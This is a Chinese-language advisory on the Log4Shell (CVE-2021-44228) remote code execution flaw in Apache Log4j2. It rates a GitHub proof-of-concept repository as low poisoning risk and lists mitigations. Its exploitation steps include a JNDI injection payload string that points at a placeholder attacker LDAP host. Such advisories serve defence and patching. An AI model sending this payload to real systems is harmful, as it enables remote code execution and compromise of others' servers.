## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)